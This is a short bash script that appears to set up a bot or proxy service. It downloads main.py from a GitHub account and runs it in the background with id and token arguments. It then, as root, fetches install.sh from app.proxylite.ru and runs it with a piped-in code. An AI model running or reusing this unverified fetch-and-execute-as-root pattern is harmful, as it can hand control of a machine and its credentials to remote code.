#!/bin/bash

log() {
    echo "$1"
}

sudo curl -O https://raw.githubusercontent.com/Flore1945/WhiteBull/main/main.py
sudo pip3 install simple-websocket requests
nohup python3 main.py --id="$1" --token="$2" --atoken="$3" > main.py.log 2>&1 &

sudo su -c "wget -O install.sh https://app.proxylite.ru/install.sh && sudo chmod +x install.sh && echo '516031' | ./install.sh"
